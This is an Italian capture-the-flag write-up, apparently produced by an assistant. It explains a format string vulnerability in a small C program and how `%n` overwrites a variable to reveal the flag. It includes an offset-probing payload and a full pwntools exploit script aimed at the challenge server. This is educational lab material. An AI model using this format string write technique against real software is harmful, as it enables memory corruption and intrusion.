Ecco la writeup basata sul template fornito e sulle informazioni della challenge:

---
# Writeup: The Answer Challenge

La challenge presenta un semplice programma C che chiede all'utente il proprio nome e poi lo stampa in modo insicuro, permettendo un attacco di format string. L'obiettivo è modificare il valore della variabile `answer` da `0xbadc0ffe` a `42` per ottenere la flag.

## Panoramica del Programma
Il programma esegue le seguenti operazioni:
1. Chiede all'utente il nome con `fgets(name, sizeof(name), stdin)`
2. Stampa il nome usando `printf(name)` senza specificare il formato (vulnerabilità di format string)
3. Se la variabile `answer` (inizializzata a `0xbadc0ffe`) viene modificata a `42`, stampa la flag

## Vulnerabilità
La vulnerabilità principale è nell'uso non sicuro di `printf`:
```c
printf(name);  // Format string vulnerability
```

Questo permette:
1. Lettura arbitraria della memoria (leak di indirizzi)
2. Scrittura arbitraria nella memoria (tramite `%n`)

## Dettagli dell'Exploit

### Individuazione dell'indirizzo di `answer`
Analizzando il binario con `objdump` o `nm`, troviamo che `answer` si trova all'indirizzo statico `0x601078` (no PIE).

### Determinazione dell'offset
Inviando una stringa di test con parametri di formato:
```
AAAA_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x
```

L'output mostra che:
- Il 10° parametro corrisponde a `name[0:8]`
- L'11° parametro corrisponde a `name[8:16]`
- Il 12° parametro corrisponde a `name[16:24]`

Per raggiungere la posizione dove possiamo scrivere l'indirizzo di `answer`, abbiamo bisogno di un padding di 6 byte.

### Tecnica di scrittura
Usiamo la specifica di formato `%42c%12$n` per:
1. Scrivere 42 caratteri (impostando così il valore a 42)
2. Usare `%n` per scrivere questo conteggio all'indirizzo specificato

## Codice di Exploit
```python
from pwn import *

# Connessione al servizio remoto
conn = remote('answer.challs.cyberchallenge.it', 9122)

# Ricezione del prompt
conn.recvuntil(b"What's your name?\n")

# Costruzione dell'input
addr = p64(0x601078)            # Indirizzo di 'answer'
format_string = b"%42c%12$n"    # Stringa di formato per scrivere 42
padding = b"a" * 6              # Padding per allineamento
input_string = format_string + b"\0" + padding + addr

# Invio dell'input
conn.sendline(input_string)

# Ricezione della flag
print(conn.recvall().decode())
```

## Spiegazione dei Componenti
1. `p64(0x601078)`: Converte l'indirizzo di `answer` in formato little-endian a 64-bit
2. `%42c%12$n`: 
   - `%42c` stampa 42 caratteri (impostando il counter di `printf` a 42)
   - `%12$n` scrive questo valore all'indirizzo specificato nella 12° posizione
3. Padding di 6 byte: Necessario per allineare correttamente l'indirizzo nella stack
4. `b"\0"`: Null byte per separare la stringa di formato dal padding

## Risultato
Quando l'exploit viene eseguito:
1. Il programma legge il nostro input malevolo
2. La format string vulnerability modifica `answer` a 42
3. Il controllo `if (answer == 42)` diventa vero
4. Il programma stampa la flag

## Lezioni Apprese
1. **Format String Vulnerability**: L'uso non sicuro di `printf` permette lettura e scrittura arbitraria in memoria
2. **Scrittura con `%n`**: Possiamo usare i formattatori per modificare valori in memoria
3. **No PIE**: L'indirizzo di `answer` è fisso e prevedibile
4. **Allineamento dello Stack**: È importante calcolare correttamente la posizione dei parametri nella stack
5. **Protezioni**: Il programma non ha stack canary e PIE è disabilitato, facilitando l'exploit

La challenge dimostra come anche un semplice programma che chiede il nome possa essere vulnerabile se non si usano correttamente le funzioni di I/O.
---
